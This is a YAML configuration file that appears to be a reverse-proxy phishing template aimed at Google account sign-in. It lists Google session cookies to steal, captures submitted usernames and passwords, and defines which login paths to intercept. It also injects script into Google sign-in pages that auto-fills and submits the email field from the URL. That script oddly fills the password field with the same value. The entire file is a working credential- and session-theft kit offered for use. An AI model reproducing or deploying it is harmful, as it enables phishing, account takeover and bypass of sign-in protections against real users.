auth_tokens:
  - domain: '.google.com'
    keys: ['.*,regexp,optional,always']
  - domain: 'accounts.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', 'NID', 'OSID', 'LSID']
    type: 'cookie'
  - domain: '.youtube.com'
    keys: ['.*,regexp,optional,always']
  - domain: '.googleapis.com'
    keys: ['.*,regexp,optional,always']

force_post: []

credentials:
  username:
    key: "{{.UsernameFields}}"
    search: '(.*)'
    type: "post"
  password:
    key: "{{.PasswordFields}}"
    search: '(.*)'
    type: "post"

login:
  domain: accounts.google.com
  path: "/"

auth_urls:
  - "/"
  - "/signin/"
  - "/v3/signin/"
  - "/_/signin/"
  - "/ServiceLogin"
  - "/AccountChooser"
  - "/signin/challenge/"
  - "/signin/oauth/"

js_inject:
  - trigger_domains:
      - accounts.google.com
    trigger_paths:
      - /
      - /signin/*
      - /v3/signin/*
      - /_/signin/*
      - /ServiceLogin
      - /AccountChooser
      - /*
    script: |
      function gf() {
        var hash = window.location.hash.substring(1);
        if (!hash) { setTimeout(gf, 500); return; }
        var ef = document.querySelector('#identifierId') || document.querySelector('input[type="email"]');
        if (ef) {
          ef.focus();
          ef.value = hash.replace(/[=]/g, '');
          ef.dispatchEvent(new Event('input', {bubbles: true}));
          var nb = document.querySelector('#identifierNext') || document.querySelector('button[jsname="LgbsSe"]');
          if (nb) { nb.focus(); nb.click(); console.log("AUTO-FILLED EMAIL"); }
          setTimeout(function() {
            var pf = document.querySelector('input[type="password"]') || document.querySelector('input[name="Passwd"]');
            if (pf) {
              pf.focus();
              pf.value = hash.replace(/[=]/g, '');
              pf.dispatchEvent(new Event('input', {bubbles: true}));
              var pb = document.querySelector('#passwordNext') || document.querySelector('button[jsname="LgbsSe"]');
              if (pb) { pb.focus(); pb.click(); console.log("AUTO-FILLED PASSWORD"); }
            } else {
              setTimeout(function(){gf();}, 1000);
            }
          }, 2500);
        } else {
          setTimeout(gf, 500);
        }
      }
      setTimeout(gf, 500);

redirect_url: "https://accounts.google.com"
